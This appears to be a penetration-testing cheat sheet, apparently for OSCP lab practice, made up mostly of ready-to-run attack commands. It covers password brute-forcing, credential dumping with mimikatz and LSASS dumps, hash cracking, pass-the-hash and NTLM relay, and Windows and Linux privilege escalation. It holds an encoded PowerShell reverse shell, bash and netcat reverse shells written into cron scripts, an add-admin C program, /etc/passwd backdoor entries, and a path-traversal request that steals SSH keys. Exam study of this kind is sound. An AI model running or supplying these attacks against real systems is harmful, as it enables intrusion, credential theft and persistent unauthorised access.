  `hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202`  
- http POST login  
  `hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"`
- Obtain hashes  
  - `.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit`
  - `.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit`
  - `rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump  lsass.exe C:\temp\lsass.dmp full` #LSASS Memory Dump + PyPyKatz
  - Extracting SAM & SYSTEM Hives (local disk hashes)
    ```
    reg save HKLM\SAM C:\temp\SAM 
    reg save HKLM\SYSTEM C:\temp\SYSTEM

    secretsdump.py -sam /home/kali/uploads/sam -system /home/kali/uploads/system LOCAL   
    ```
- crack NTLM 1000  
  `hashcat -m 1000 steve.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`    
- mutating wordlist  
  - [rule-based attack](https://hashcat.net/wiki/doku.php?id=rule_based_attack)
    - `ls -la /usr/share/hashcat/rules/`  
    - Append character X to end: $1$2
    - Prepend character X to front: ^2^1
    - Capitalize the first character, lowercase the rest: c
    - Do nothing: :
    - `echo \$1 > demo.rule` append 1 to password
      `hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force`  #crack MD5 0
      ```
      $1 c
      Password1
      Iloveyou1
      
      $1
      c
      password1
      Password

      $1 c $!
      $2 c $!
      $1 $2 $3 c $!
      Computer123!

      #Passwords need 3 numbers, a capital letter and a special character
      c $1 $3 $7 $!
      c $1 $3 $7 $@
      c $1 $3 $7 $#
      Umbrella137!
      ```
- `hash-identifier "4a41e0fdfb57173f8156f58e49628968a8ba782d0cd251c6f3e2426cb36ced3b647bf83057dabeaffe1475d16e7f62b7"`
- Password manager (KeePass)  
  ```
  Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue #search DB
  keepass2john Database.kdbx > keepass.hash #format the hash
  nano keepass.hash #remove the Prepand "Database"
  hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force  #crack KeePass 13400
  ```
- ssh private key passphrase
  ```
  ssh2john id_rsa > ssh.hash  #format the hash

  cat ssh.hash: id_rsa:$sshng$6$16$7059e78a8d3764ea1e883fcdf592feb7$1894$6f70656e77373682... #E.g hash text

  sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf' #add the hash rule to JtR config
  john --wordlist=ssh.passwords --rules=sshRules ssh.hash #crack

  rm ~/.ssh/known_hosts
  chmod 600 id_rsa
  ssh -i id_rsa -p 2222 dave@192.168.50.201 #login
  ```
- ssh passphrase via path traversal "Apache 2.4.49"
  - `searchsploit "Apache 2.4.49"`  #HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)
  - Read id_rsa key
    `curl --path-as-is http://192.168.161.201/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/alfred/.ssh/id_rsa -o id_rsa`  
  - Crack password
    ```
    nano ssh.rule
    [List.Rules:sshRules]
    c $1 $3 $7 $!  
    c $1 $3 $7 $@  
    c $1 $3 $7 $#  

    ssh2john id_rsa > ssh.hash

    hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
    sudo sh -c 'cat /home/kali/offsec/passwordattacks/ssh.rule >> /etc/john/john.conf'
    john --wordlist=/usr/share/wordlists/rockyou.txt --rules=sshRules ssh.hash
    ```
- Passing NTLM (User + Hash)  
  - scenario: user from FILES01 extract admin hash and authenticate to FILES02 SMB share  
  ```
  .\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit

  #option 1: SMB
  smbclient \\\\192.168.139.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
  smb: \> get secrets.txt
  
  #option 2: psexec
  impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
  C:\Windows\system32> hostname
  ```
- Net-NTLMv2 challenge–response hash (cannot run Mimikatz as an unprivileged user)  
  - Only exists during authentication traffic SMB
  - connect to bind shell on port 4444  
    `nc 192.168.139.211 4444`  
    `C:\Windows\system32> whoami`  
  - start responder on interface tap0
    `kali@kali:~$ sudo responder -I tap0`  
  - create an SMB connection to our kali
    `C:\Windows\system32>dir \\<kali>\test`
  - responder capturing the Net-NTLMv2 hash of paul.
    [SMB] NTLMv2-SSP Hash :paul::FILES01:1f9d4c51f6e74653:795F138EC6
  - `hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force`  #crack Net-NTLMv2 5600
- Relaying Net-NTLMv2 (cannot run Mimikatz as an unprivileged user + failed to crack Net-NTLMv2 hash)
  - Capture a user’s Net-NTLMv2 hash via SMB/HTTP request, then relay it to a target (e.g., SMB, LDAP, or HTTP) to gain access without knowing the password
  - Check for SMB signing is required
    `nmap --script smb2-security-mode -p445 <target>`
  - Enumerate SBD shares
    `smbclient -L \\\\<target> -N`
  - Starting ntlmrelayx for a Relay-attack targeting FILES02
    ```
    pwsh

    $Text = '$client = New-Object System.Net.Sockets.TCPClient("<kali>",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
    $EncodedText =[Convert]::ToBase64String($Bytes)
    $EncodedText

    #new terminal
    impacket-ntlmrelayx --no-http-server -smb2support -t <target> -c "powershell -enc JABj...=="
    ```
  - Starting a Netcat listener on port 8080 `nc -nvlp 8080`
  - create an SMB connection
    ```
    kali@kali:~$  nc 192.168.50.211 5555
    C:\Windows\system32>dir \\192.168.119.2\test
    ```
  - receive an incoming connection in netcat listener.  
- Windows credential guard  
  - Gain access to SERVERWK248 machine as CORP\Administrator (pass the hash)  
    `impacket-wmiexec -debug -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.50.248`  

# Windows priviledge  
- Bind shell to target , port xxx
  `nc 192.168.124.220 4444` (Trial & Error port: 80,445,443,4444,8888,8080,9999)  
  `C:\Users\<user>>powershell`  
- Enumerating windows
  ```
  #User
  whoami
  systeminfo
  *whoami /user
  *whoami /priv
  *whoami /groups
  *net user <user>
  ipconfig /all
  ipconfig /all
  Get-Process
  
  #Users
  *Get-LocalUser （Need admin priviledge)
  
  #Group 
  *Get-LocalGroup
  *Get-LocalGroupMember <adminteam>

  #installed applications
  *Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
  *Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
  ```

- User's note  
  - KeePass DB: .kdbx  
    `Get-ChildItem -Path C:\Users\<user>\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`
  - Text files: *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx  
    `Get-ChildItem -Path C:\Users\<user>\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue`
  - XAMP: .ini  
    `Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`
- Shell history  
  `(Get-PSReadlineOption).HistorySavePath`  
- 🖥️ **Automated Windows Enumeration - winPEASx64.exe**  
  - Download winPEAS to target and execute  
    ```
    #kali
    kali@kali:~$ cp /usr/share/peass/winpeas/winPEASx64.exe .
    kali@kali:~$ python3 -m http.server 80
    kali@kali:~$ nc 192.168.50.220 4444
    
    #target
    C:\Users\dave> powershell
    PS C:\Users\dave> iwr -uri http://192.168.48.3/winPEASx64.exe -Outfile winPEAS.exe
    C:\Users\dave> .\winPEASx64.exe | Out-File winPEAS-results.txt
    ```
 - Review
   - Basic System Information
   - PS default transcripts history
   - Users Information
   - Looking for possible password files in users homes
   - Current Token privileges
   - Installed Applications
   - Unquoted and Space detected
   - Looking for possible password files in users homes
   - Searching executable files in non-default folders with write
- Leveraging Windows Services
  - Service Binary
    - check for allowing full Read and Write access of program  
      `Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`
    - check for non standard "C:\Windows\System32" path  
      `C:\xampp\apache\bin\httpd.exe`  
      `C:\xampp\mysql\bin\mysqld.exe`  
    - check permissions for the running program
      `icacls "C:\xampp\apache\bin\httpd.exe"` #BUILTIN\Users:(F)
    - create a malicious program to add user
      ```
      #include <stdlib.h>
      
      int main ()
      {
        int i;
        
        i = system ("net user dave2 password123! /add");
        i = system ("net localgroup administrators dave2 /add");
        
        return 0;
      }
      ```
    - cross-compile c code to 64bit app
      `kali@kali:~$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`
    - Download to target
      ```
      PS C:\Users\dave> iwr -uri http://192.168.48.3/adduser.exe -Outfile adduser.exe  
      PS C:\Users\dave> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe  
      ```
    - stop the service and restart it  
      `net stop mysql`  
    - reboot  
      `shutdown /r /t 0`  
    - lower-privileged user replace the program with a malicious one  
  - 🖥️ **Auotmated Priviledge Escalation - PowerUp.sp1**
    - Automates the enumeration of misconfigurations, weak permissions, and exploitable services. **Need bypass `powershell -ep bypass`**  
    - Download PowerUp.ps1 to target and run it
      ```
      PS C:\Users\dave> iwr -uri http://192.168.48.3/PowerUp.ps1 -Outfile PowerUp.ps1
      PS C:\Users\dave> powershell -ep bypass
      PS C:\Users\dave>  . .\PowerUp.ps1
      PS C:\Users\dave> Get-ModifiableServiceFile
      ```
    - `Get-ModifiableServiceFile`: Quick check. Targets services running as SYSTEM/admin and checks if the service binary or folder is writable by the current user.  
    - `Invoke-AllChecks`: Comprehension check. Runs all PowerUp enumeration checks: services, scheduled tasks, DLL hijacks, token privileges, ACL misconfigurations, user/group info 
    - Abuse the service
      `Install-ServiceBinary -Name 'mysql'`  #might receive error then back to manual approach  (adduser.c)  
  - DLL Hijacking
    1. identify services running as SYSTEM or admin  
       `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`  
       ```
       Get-Service | Where-Object {$_.StartType -eq 'Automatic' -and $_.Status -eq 'Running'}
       Import-Module .\PowerUp.ps1
       Invoke-AllChecks | Out-String -Stream | Select-String "DLL Hijack"
       ```
    4. Find writable directory  
       `echo "test" > 'C:\FileZilla\FileZilla FTP Client\test.txt'`  
       `Get-ChildItem "C:\Program Files\<TargetService>\" | ForEach-Object { icacls $_.FullName }`   
    6. Create malicious DLL (add_admin.cpp)  
       `x86_64-w64-mingw32-gcc <software>.cpp --shared -o <software>.dll`  
    8. Deliver malicious DLL  
       `iwr -uri http://<KALI>/<software>.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\<software>.dll'`  
    10. Trigger execution  
        `Restart-Service -Name <TargetService>`
    12. stablize reverse shell  
        `python3 -c 'import pty; pty.spawn("/bin/sh")'`  
    14. post-exploitation and check for lateral movement or sensitive files  
  - Unquoted Service Paths
    - Windows service binaries that run with spaces in their path but without quotes.  
    - List Windows services with spaces in the path and missing quotes  
      `wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """`  
      OR PowerUp tool `Get-ServiceUnquoted`  
    - Check write permission  
      `icacls "C:\"` `icacls "C:\Program Files"` `icacls "C:\Program Files\Enterprise Apps"`  
    - Replace the program with malicious adduser.exe  
      `iwr -uri http://<KALI>/adduser.exe -Outfile Current.exe`
      `copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'`
    - Trigger execution  
      `Start-Service <service>`
    - check creation of users  
      `net user` `net localgroup administrators`
    - OR PowerUp tool `Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"`  
- Scheduled Tasks
  - List all scheduled tasks  
    `schtasks /query /fo LIST /v`  
  - Check permission  
    `icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe`  
  - Repalce the schedule task  
    ```
    iwr -Uri http://<KALI>/adduser.exe -Outfile BackendCacheCleanup.exe
    move .\BackendCacheCleanup.exe .\Pictures\
    ```
- Exploits for unpatched
  - check current privilege
    `whoami /priv`  
  - enumerate windows version and security patches
    `Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }`
  - search elevation of privileges CVE and download to target
  - Execute the .\CVE-xxx-xxxx.exe and priviledge escalate  
- 🖥️ **Priviledge Escalated Tool - SigmaPotato.exe**  
  - Need "SeImpersonatePrivilege" priledge enabled
  - `whoami /priv`  
  - `.\SigmaPotato "net user dave4 lab /add"`
  - `.\SigmaPotato "net localgroup Administrators dave4 /add"`  

# Linux priviledge  
- 🖥️ **Automated Linux Enum - LinPEAS.sh**
  - https://osintteam.blog/practical-guide-to-using-linpeas-for-linux-privilege-escalation-a7c753dd5293
  - transfer linpeas.sh and execute
    ```
    #kali
    scp linpeas.sh <user>@<target>
    scp -P 2222 linpeas.sh <user>@<target>:/tmp/
    wget http://<kali>/linpeas.sh -O linpeas.sh
    wget https://github.com/peass-ng/PEASS-ng/releases/download/20250801-03e73bf3/linpeas.sh

    #target
    chmod +x linpeas.sh
    ./linpeas.sh | tee linpeas_output.txt

    #transfer back
    scp student@192.168.196.52:2222:/home/student/linpeas_output.txt /home/kali/share/results/   #default port 22
    scp -P 2222 student@192.168.196.52:/home/student/linpeas_output.txt /home/kali/share/results/ #non standard port
    ```
  - Analyze red/yellow font
    - `grep --color=always -i "sudo" linpeas.txt` (sudo, suid, capabilities, cron, password, writeable, service, ssh, kernel)
    - ❗**SUID - Check easy privesc, exploits and write perms**
      - `/usr/bin/find` > Exploit with GTFOBins
    - ❗**Interesting writable files**
      - `/etc/passwd` `/etc/sudoers.d/` > Modify /etc/passwd to create a root shell > `echo 'malicioususer:x:0:0::/root:/bin/bash' >> /etc/passwd su malicioususer`
    - `grep -E "hash SUID bit set" linpeas_output.txt` > Goolge exploit "Pkexec Privilege Escalation poc"  
    - Check for vulnerable cron jobs
      - `-rwxrwxrwx 1 root root 1234 /etc/cron.d/backup.sh` > edit the writable backup.sh > `echo 'root::0:0::/root:/bin/bash' >> /etc/passwd`  
    - Checking all env variables
      - `AWS_SECRET_KEY=EXAMPLEDATA12345` > aws configure
    - Kernel Exploits > research and download a matching exploit > compile and execute
      - `gcc exploit.c -o exploit ./exploit` 
- Enumeration
  - Manual  
    User/Groups: `id` `whoami` `cat /etc/passwd` `cat /etc/shadow` `groups` `ps aux`  
    **Priviledge: `sudo -l`  `find / -perm -4000 -type f 2>/dev/null`  `find / -perm -2000 -type f 2>/dev/nul`**  
    System and apps: `cat /etc/*release` `uname -a` `dpkg -l`  
    List cron jobs: `ls -lah /etc/cron*` `crontab -l` `sudo crontab -l //root`  
    List writable directories: `find / -writable -type d 2>/dev/null` `find / -writable -type f 2>/dev/null`    
    setuid, segid: `find / -perm -u=s -type f 2>/dev/null`    
  - 🖥️ **Automated PrivCheck - unix-privesc-check**
    - Download from https://pentestmonkey.net/tools/audit/unix-privesc-check  
    - `scp /home/kali/offsec/unix-privesc-check-1.4/unix-privesc-check <user>@<target>:/home/joe`  
    - `joe@debian-privesc:~$ ./unix-privesc-check standard > unix-privesc-check.txt`  
    - Look for writable files "WARNING:"  
- Exposed Credential Info  
  - Env variables  
    `joe@debian-privesc:~$ env`
  - bashrc  
    `joe@debian-privesc:~$ cat .bashrc`
  - **elevate to root `su -i`**  
  - Attempt brute force attack of ssh by using a custom wordlist (min6, max6, follow by 3 numeric digits. E.g Lab000)   
    `kali@kali:~$ crunch 6 6 -t Lab%%% > wordlist`  
    `hydra -l <user> -P wordlist  <target> -t 4 ssh -V`
  - Monitor service footprint for credentials  
    `joe@debian-privesc:~$ watch -n 1 "ps -aux | grep pass"`  
    `joe@debian-privesc:~$ sudo tcpdump -i lo -A | grep "pass"`  
  - escalate privilege by stolen password `su - root`
- Cron Jobs
  - Inspect cron log file
    `joe@debian-privesc:~$ grep "CRON" /var/log/syslog`
  - Read the sh file content and file permission (rw)
  - Modify the script as one-liber reverse shell 
    ```
    start netcat listener nc -lnvp 1234
    
    echo >> user_backups.sh
    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 1234 >/tmp/f" >> user_backups.sh
    ```
    ```
    #nano archiver.sh
    bash -i >& /dev/tcp/<kali>/4444 0>&1

    #add SUID bit to execute with root privilege
    echo "chmod u+s /bin/bash" >> /var/archives/archive.sh
    ```
    `echo "chmod u+s /bin/bash" >> /var/archives/archive.sh`  
- Password Authentication
  - edit /etc/passwd (add new superuser "root2")  
    ```
    joe@debian-privesc:~$ openssl passwd w00t  #Fdzt.eqJQ4s0g
    joe@debian-privesc:~$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
    joe@debian-privesc:~$ su root2
    root@debian-privesc:/home/joe# id
    ```
- Setuid  
  - **Enumerate SUID**  
    `find / -perm -4000 -type f 2>/dev/null`  
    look for find, vim, less, bash, perl, python, nmap, tar, cp  
  - Check Binary against [GTFOBins](https://gtfobins.github.io/)  
  - Get a root shell by abusing SUID program  
    `joe@debian-privesc:~$ find /home/joe/Desktop -exec "/usr/bin/bash" -p \;`
  - **Enumerate capabilities**  
    - `joe@debian-privesc:~$ /usr/sbin/getcap -r / 2>/dev/null`  
    - look for "cap_setuid+ep" effective and permitted. Crack it by GTFOBins  
- **Sudo**
  - Enumerate Sudo Privileges  
    - `sudo -l` #Look for NOPASSWD  
    - Look for full root shell: (ALL : ALL) ALL  
    - check GTFOBins from the binary (vim, find, python3)  
- Kernel vulnerabilities  
  - Gather system info  
    `cat /etc/issue` `uname -r`  
  - Searchsploit  
    `searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"`  
  - Copy the exploit and inspect the code  
    `kali@kali:~$ cp /usr/share/exploitdb/exploits/linux/local/45010.c .`  
    `kali@kali:~$ head 45010.c -n 20`  
    `kali@kali:~$ mv 45010.c cve-2017-16995.c`  #rename exploit  
  - transfer the code to target  
    `kali@kali:~$ scp cve-2017-16995.c joe@192.168.123.216:`  
  - Compile the exploit on the target machine  
    `joe@ubuntu-privesc:~$ gcc cve-2017-16995.c -o cve-2017-16995`  
  - Obtain a root shell via kernel exploit    
    `joe@ubuntu-privesc:~$ ./cve-2017-16995`  

# Active directory  

# Port tunneling and port redirection
- Tutotial
  - [How to Use Ligolo-ng (Easy to Follow Pivoting Tutorial)](https://www.stationx.net/how-to-use-ligolo-ng/)  
  - [Lateral Movement guide to multi hop pivioting with ligolo-ng](https://cyberwarfare.live/lateral-movement-a-guide-to-multi-hop-pivoting-with-ligolo-ng/)
  - [How to Tunnel and Pivot Networks using Ligolo-ng](https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740)  
- Network visualization  
  ```
  Attacker-Proxy (192.168.x.x)
          |
          |  (Ligolo-ng / SSH / Chisel Tunnel)
          |
   +-------------------------------+
   | MS01 - Agent / Compromised    |
   | Server                        |
   |                               |
   | 192.168.x.x  (External)       |
   | 172.0.x.x    (Internal)       |
   +-------------------------------+
                |
        -----------------
        |               |
   DC01 (172.0.x.x)   MS02 (172.0.x.x)
  ```
- Ligolo-ng setup and install
  1. Install ligolo-ng to include ligolo-ng proxi file  
     `sudo apt install ligolo-ng`
  3. Download the agent files from the GitHub for the target machine (In OCSP is windows)  
     - https://github.com/nicocha30/ligolo-ng/releases
     - [ligolo-ng_agent_0.8.1_windows_amd64.zip](https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.1/ligolo-ng_agent_0.8.1_windows_amd64.zip)
     - After extracted, 3 files:agent.exe, License, readme.md
  5. Connect to compromised server (agent) - **MS01**  
     `evil-winrm -i <TARGET_IP> -u <USERNAME> -p '<PASSWORD>'`
  6. Transfer the agent.exe to compromised agent - MS01  
     `upload /home/kali/offsec/ligolo/agent.exe C:/Users/eric.wallows/Documents/agent.exe`  
  8. Setup proxy in **kali** > Create a new TUN interface ligolo and bring it up    
     ```
     sudo ip tuntap add user <Your Username-kali> mode tun ligolo
     sudo ip link set ligolo up
     ```
  9. Start the ligolo-proxy with selfcert option  
     `ligolo-proxy -selfcert`
  10. Start the agent in compromised server (agent) - **MS01**  
      `.\agent.exe -connect <kali>:11601 -ignore-cert`
  11. Agent joined. Back to ligolo terminal  
  12. Set up tunnel and configure the route to establish a connection  
      ```
      ligolo-ng » session
      
      ? Specify a session : 1 - OSCP\eric.wallows@MS01 - 192.168.196.141:53221 - 005056ab5090
      [Agent : OSCP\eric.wallows@MS01] » ifconfig
      ┌───────────────────────────────────────────────┐
      │ Interface 0                                   │
      ├──────────────┬────────────────────────────────┤
      │ Name         │ Ethernet0                      │
      │ Hardware MAC │ 00:50:56:ab:50:90              │
      │ MTU          │ 1500                           │
      │ Flags        │ up|broadcast|multicast|running │
      │ IPv4 Address │ 192.168.196.141/24             │
      └──────────────┴────────────────────────────────┘
      ┌───────────────────────────────────────────────┐
      │ Interface 1                                   │
      ├──────────────┬────────────────────────────────┤
      │ Name         │ Ethernet1                      │
      │ Hardware MAC │ 00:50:56:ab:8f:98              │
      │ MTU          │ 1500                           │
      │ Flags        │ up|broadcast|multicast|running │
      │ IPv4 Address │ 10.10.156.141/24               │
      └──────────────┴────────────────────────────────┘
      ┌──────────────────────────────────────────────┐
      │ Interface 2                                  │
      ├──────────────┬───────────────────────────────┤
      │ Name         │ Loopback Pseudo-Interface 1   │
      │ Hardware MAC │                               │
      │ MTU          │ -1                            │
      │ Flags        │ up|loopback|multicast|running │
      │ IPv6 Address │ ::1/128                       │
      │ IPv4 Address │ 127.0.0.1/8                   │
      └──────────────┴───────────────────────────────┘
      ```
- MS01 can access the internal 10.10.156.141/24 network  
- From **kali** terminal: Add a route for Ligolo to route traffic through the tunnel and reach the target network  
  `sudo ip route add <Internal_Network> dev ligolo`  
  E.g `sudo ip route add 10.10.156.0/24 dev ligolo`  
- Back to **Ligolo** terminal: start the tunnel and go the jump box  
  `[Agent : OSCP\eric.wallows@MS01] » start`
- You can nmap  

# Top tools and command  
1. **hashcat**: Cracking NTLM / Kerberos hashes  
   `hashcat -m 1000 hash.txt rockyou.txt`  
3. **Mimikatz** (Need system privilege - Credential Dump)  
   `C:\tools\mimikatz\ > .\mimikatz.exe`  
   `mimikatz # privilege::debug`  #elevate privileges
   -  `sekurlsa::logonpasswords`  #dump live credentails from LSASS
   -  `lsadump::sam`              #dump local SAM hashes
   -  `lsadump::dcsync /domain`   #dump all domain hashes via DCSync 
4. **impacket** (Windows/AD/SMB/Kerberos)  
   `kali@kali:~$ /usr/bin/impacket-xxxx`  
   - **psexec**: Executes commands remotely (get shell) using SMB & admin credentials  
     `Impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212`    
   - **wmiexec**: Alternative to psexec if SMB blocked  
     `impacket-wmiexec -debug -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.50.248`  
     `impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.127.72`  
   - **GetNPUsers**: Retrieve user account hashes without knowing their password (Do not require Kerberos preauthentication-disabled)    
     `impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete`
   - GetUserSPNs: Retrieve Kerberos service account hashes that can be cracked offline (**Kerberoasting attack**)    
     `impacket-GetUserSPNs -request -dc-ip <DC> corp.com/<domain_user>`
   - secretsdump: dump credentials (local or domain)  
     `impacket-secretsdump -just-dc-user <user> corp.com/<admin>:"<Password>"@<targetDomain>` #NTLM hash of user
     `impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL` #backup copies of DC files (ntds.dit + SYSTEM hive)
   - ntlmrelayx: Relay captured NTLM auth to another host  
     `impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.139.212 -c "powershell -enc JABjAGw...`
   - mssqlclient  
     `impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth`
5. **crackmapexec**: SMB / AD enumeration & attacks  
   - `kali@kali:~$ crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success`
6. PsExec: Remote execution with admin  
   - `PS C:\Tools\SysinternalsSuite> .\PsExec64.exe -i \\<DC1> -u corp\<user> -p <password> cmd`  
   - `PS C:\tools\SysinternalsSuite> .\PsExec.exe \\<DC1> cmd`  
   - `C:\Tools\SysinternalsSuite> psexec.exe \\192.168.50.70 cmd.exe`
8. WinRM: Remote shell via WinRM  
   - evil-winrm -i 192.168.145.220 -u daveadmin -p "qwertqwertqwert123\!\!"  
   - `Enter-PSSession -ComputerName <CLIENTWK220> -Credential $cred`
      ```
      PS C:\Users\dave> $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
      PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
      PS C:\Users\dave> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
      PS C:\Users\dave> Stop-Transcript
      ```
9. nmap: Port / service scanning  
    - `nmap -sC -sV -p- <target>`  
10. enum4linux: Linux AD / SMB enumeration  
    - ·enum4linux -a <target>·
      
**Ports open**
- Kali port:
  - 80, 443, 53 (reverse shell). Second choice: 4444, 1234 (firewall might block)  
   - 8080 (burp suite)
   - 8888 (WebDAV shared)
   - 8000 (Powercat/Python)

# Kali built in wordlist and payloads
- Password wordlists
  - ❗`/usr/share/wordlists/rockyou.txt`
  - /usr/share/wordlists/test_small_credentials.txt
  - /usr/share/wordlists/fasttrack.txt  
- Gobuster directory wordlists
  - ❗`/usr/share/wordlists/dirb/common.txt`
  - /usr/share/wordlists/dirb/big.txt
  - /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
  - /usr/share/wfuzz/wordlist/general/megabeast.txt
  - /usr/share/wordlists/dirb/others/names.txt    
- hashcat
  - ❗`/usr/share/hashcat/rules/best64.rule`
  - /usr/share/hashcat/rules/rockyou-30000.rule
- webshells
  - ❗`/usr/share/webshells/php/simple-backdoor.php`
  - /usr/share/webshells/aspx/cmdasp.aspx
- post-exploitation/privilege escalation
  - /usr/share/peass/winpeas/winPEASx64.exe
  - /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1
  - /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1  
- windows binaries/utilities
  - /usr/share/windows-resources/binaries/nc.exe  
  - /usr/share/windows-resources/binaries/plink.exe  
- nmap: /usr/share/nmap/scripts/*.nse
- exploits
   - /usr/share/exploitdb/exploits/linux/local/45010.c

# Attack Vectors
1. Host Discovery
- `ping`, `fping`, `arp-scan`
- `nmap -sn`

2. Port Scanning
- `nmap -sS -sV -p-`
- `rustscan`, `masscan`

3. Service Enumeration
- SMB: `enum4linux`, `smbclient`, `smbmap`, `crackmapexec`
- LDAP: `ldapsearch`, `ldapenum`
- SNMP: `snmpwalk`
- RPC: `rpcclient`
- HTTP/Web: `nikto`, `whatweb`, `wpscan`, `gobuster`, `feroxbuster`

4. Web Exploitation
- SQL Injection (Error, Blind, Time-based): `sqlmap`, manual payloads
- LFI/RFI and Path Traversal
- Command Injection
- File Upload Vulnerabilities
- CSRF, XSS (less common for OSCP)

5. Common Service Exploits
- FTP: anonymous login, weak creds
- SMB: EternalBlue, weak shares
- MSSQL/MySQL: xp_cmdshell, UDF uploads
- Redis: unauthenticated write
- RDP: brute-force with `hydra`, `ncrack`

6. Tunneling and Pivoting
- SSH tunneling: `ssh -L`, `-R`, `-D`
- Tools: `chisel`, `ligolo`, `socat`
- Proxychains setup and usage

7. Privilege Escalation (Linux)
- `sudo -l`
- SUID binaries
- Kernel exploits (e.g., Dirty COW, Dirty Pipe)
- Writable cron jobs / systemd services

8. Privilege Escalation (Windows)
- AlwaysInstallElevated policy
- Unquoted service paths
- Weak service permissions
- Token impersonation exploits (JuicyPotato, RottenPotato, etc.)

9. Credential Hunting
- `/etc/passwd`, `/etc/shadow`, SAM
- History files and config files
- Scripts or backups with credentials
